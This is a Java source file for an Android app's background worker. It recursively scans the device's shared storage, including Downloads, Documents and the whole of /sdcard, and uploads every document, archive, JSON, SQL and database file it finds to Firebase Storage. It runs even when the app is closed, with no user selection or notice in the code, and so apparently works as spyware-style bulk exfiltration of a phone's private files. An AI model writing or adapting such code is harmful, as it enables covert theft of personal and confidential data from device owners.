package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
    private long startTime;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();
        
        Log.d(TAG, "⏰ Document upload worker started");
        Log.d(TAG, "🔑 Checking permissions...");
        
        // Check if app has storage permissions
        if (!FeaturePermissions.hasGalleryPermission(getApplicationContext())) {
            Log.w(TAG, "❌ NO STORAGE PERMISSION - Cannot scan files!");
            Log.w(TAG, "   Required: READ_MEDIA_* and MANAGE_EXTERNAL_STORAGE");
            return Result.retry();
        }
        Log.d(TAG, "✓ Storage permission OK");
        
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }
            
            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "📤 Starting document upload for user: " + userId);
            
            uploadDocuments(userId);
            
            long duration = System.currentTimeMillis() - startTime;
            if (uploadedCount > 0) {
                Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
            } else {
                Log.w(TAG, "⚠️  Document upload completed in " + duration + "ms - NO documents found!");
                Log.w(TAG, "   Possible reasons:");
                Log.w(TAG, "   1. No files on device matching supported types");
                Log.w(TAG, "   2. Files in unsupported directories");
                Log.w(TAG, "   3. Permission denied accessing /sdcard or /storage paths");
                Log.w(TAG, "   4. Timeout before scan completed (increase MAX_WORK_TIME_MS)");
            }
            
            // Always return success - documents will be retried next cycle if needed
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "❌ Document upload worker error", e);
            e.printStackTrace();
            return Result.retry();
        }
    }
    
    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        Log.d(TAG, "🔍 Starting comprehensive FILE scan for user: " + userId);
        Log.d(TAG, "📤 Will upload ALL FILES (except system/cache/hidden)");
        
        // PRIORITY 1: Most important locations
        String[] priority1Paths = {
                "/sdcard/Download",
                "/sdcard/Downloads", 
                "/sdcard/Documents",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Downloads",
                "/storage/emulated/0/Documents",
        };
        
        Log.d(TAG, "📂 PRIORITY 1: Scanning common folders...");
        for (String path : priority1Paths) {
            if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory() && dir.canRead()) {
                    Log.d(TAG, "   → " + path);
                    int filesBefore = uploadedCount;
                    scanDirectoryRecursive(dir, userId, 0);
                    if (uploadedCount - filesBefore > 0) {
                        Log.d(TAG, "      ✓ Found " + (uploadedCount - filesBefore) + " files");
                    }
                }
            }
        }
        
        // PRIORITY 2: External storage root - scan EVERYTHING
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL files)...");
            File sdcard = new File("/sdcard");
            if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                int filesBefore = uploadedCount;
                scanDirectoryRecursiveDeep(sdcard, userId, 0);
                if (uploadedCount - filesBefore > 0) {
                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
                }
            }
        }
        
        // PRIORITY 3: Storage emulated path
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0 (ALL files)...");
            File storage = new File("/storage/emulated/0");
            if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                int filesBefore = uploadedCount;
                scanDirectoryRecursiveDeep(storage, userId, 0);
                if (uploadedCount - filesBefore > 0) {
                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
                }
            }
        }
        
        Log.d(TAG, "✓ File scan complete - " + uploadedCount + " total files uploaded");
    }
    
    /**
     * Deep recursive scan with NO depth limit (will traverse entire directory tree).
     * Use with caution - adds timeout checks to avoid ANR.
     */
    private void scanDirectoryRecursiveDeep(File dir, String userId, int depth) {
        // Check timeout frequently
        if (isTimeoutApproaching()) {
            Log.w(TAG, "Timeout - stopping deep scan at depth " + depth);
            return;
        }
        
        if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                return;
            }
            
            // Log current directory being scanned (at shallow depths)
            if (depth < 3) {
                Log.d(TAG, "   Scanning: " + dir.getPath() + " (" + files.length + " items)");
            }
            
            for (File file : files) {
                // Check limits
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }
                
                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 4) {
                        // Recursively scan subdirectories (deeper than before)
                        scanDirectoryRecursiveDeep(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "   ⚠️  Permission denied accessing: " + file.getName());
                    // Continue with next file
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    /**
     * Recursively scan directories for documents with depth limit and timeout
     */
    private void scanDirectoryRecursive(File dir, String userId, int depth) {
        // Limit recursion depth to avoid taking too long
        if (depth > 2) {
            return;
        }
        
        // Check timeout
        if (isTimeoutApproaching()) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null) {
                Log.d(TAG, "      ⚠️  listFiles() returned null for: " + dir.getPath());
                return;
            }
            
            if (files.length == 0) {
                Log.d(TAG, "      (empty)");
                return;
            }
            
            Log.d(TAG, "      Found " + files.length + " items");

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }

                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 2) {
                        // Recursively scan subdirectories (max 2 levels deep)
                        Log.d(TAG, "      → Scanning subdirectory: " + file.getName());
                        scanDirectoryRecursive(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            Log.d(TAG, "      ✓ Found document: " + file.getName() + " (" + (file.length()/1024) + " KB)");
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "      ⚠️  Permission denied: " + file.getName());
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "      ⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        
        String name = file.getName();
        
        // SKIP system/app files
        if (name.startsWith(".") ||                    // Hidden files
            name.endsWith(".apk") ||                   // APK files
            name.contains("cache") ||                  // Cache directories
            name.contains("tmp") ||                    // Temp files
            name.contains("Thumbs") ||                 // Thumbnail cache
            name.contains(".db-journal") ||            // Database journals
            name.endsWith(".lock")) {                  // Lock files
            return false;
        }
        
        String lower = name.toLowerCase();
        
        // ONLY INCLUDE DOCUMENTS - NOT IMAGES, VIDEO, OR AUDIO
        
        // Office documents
        if (lower.endsWith(".pdf") ||
            lower.endsWith(".docx") ||
            lower.endsWith(".doc") ||
            lower.endsWith(".xlsx") ||
            lower.endsWith(".xls") ||
            lower.endsWith(".pptx") ||
            lower.endsWith(".ppt") ||
            lower.endsWith(".csv") ||
            lower.endsWith(".txt") ||
            lower.endsWith(".odt") ||
            lower.endsWith(".ods")) {
            return true;
        }
        
        // Archives
        if (lower.endsWith(".zip") ||
            lower.endsWith(".rar") ||
            lower.endsWith(".7z") ||
            lower.endsWith(".tar") ||
            lower.endsWith(".gz")) {
            return true;
        }
        
        // Config/Data files
        if (lower.endsWith(".json") ||
            lower.endsWith(".xml") ||
            lower.endsWith(".sql") ||
            lower.endsWith(".db")) {
            return true;
        }
        
        // NO IMAGES, NO VIDEO, NO AUDIO
        return false;
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + file.lastModified());
            long fileSize = file.length();
            
            Log.d(TAG, "  Uploading: " + fileName + " (" + (fileSize / 1024) + " KB)");
            
            // Read file into memory
            byte[] fileBytes = readFileBytes(file);
            if (fileBytes == null || fileBytes.length == 0) {
                Log.e(TAG, "  ❌ Failed to read file: " + fileName);
                return;
            }
            Log.d(TAG, "  ✓ File read into memory: " + fileBytes.length + " bytes");
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            // Upload synchronously (blocking) using Tasks
            try {
                storageRef.putBytes(fileBytes).getResult();
                Log.d(TAG, "  ✓ Uploaded to Storage");
                
                // Now get download URL
                String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
                Log.d(TAG, "  ✓ Got download URL");
                
                // Record in database
                recordDocumentInDatabase(userId, fileName, downloadUrl, fileSize);
                Log.d(TAG, "  ✓ Recorded in Database: " + fileName);
                
            } catch (Exception uploadError) {
                Log.e(TAG, "  ❌ Firebase upload failed: " + fileName, uploadError);
            }

        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error uploading file: " + file.getName(), e);
        }
    }
    
    /**
     * Read file bytes from disk
     */
    private byte[] readFileBytes(File file) {
        try {
            if (!file.exists() || !file.canRead()) {
                Log.e(TAG, "Cannot read file: " + file.getPath());
                return null;
            }
            
            long fileSize = file.length();
            if (fileSize > 100 * 1024 * 1024) {  // Skip files > 100MB
                Log.w(TAG, "⚠️  File too large (>100MB), skipping: " + file.getName());
                return null;
            }
            
            byte[] bytes = new byte[(int) fileSize];
            try (FileInputStream fis = new FileInputStream(file)) {
                int totalRead = 0;
                int bytesRead;
                while ((bytesRead = fis.read(bytes, totalRead, bytes.length - totalRead)) != -1) {
                    totalRead += bytesRead;
                }
                if (totalRead < bytes.length) {
                    Log.w(TAG, "⚠️  Incomplete read: " + totalRead + "/" + bytes.length + " bytes");
                }
                return bytes;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file bytes: " + file.getName(), e);
            return null;
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("mimeType", getMimeType(fileName));
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("timestamp", System.currentTimeMillis());
            docData.put("userId", userId);

            // Write synchronously (blocking) to ensure data is saved
            try {
                documentsRef.child(docId).setValue(docData).getResult();
                Log.d(TAG, "  ✓ Metadata saved to DB");
            } catch (Exception e) {
                Log.e(TAG, "  ❌ Failed to save metadata: " + fileName, e);
            }
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error recording document: " + fileName, e);
        }
    }
    
    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (lower.endsWith(".txt")) return "text/plain";
        if (lower.endsWith(".csv")) return "text/csv";
        return "application/octet-stream";
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
        Log.d(TAG, "Document upload work enqueued");
    }
}
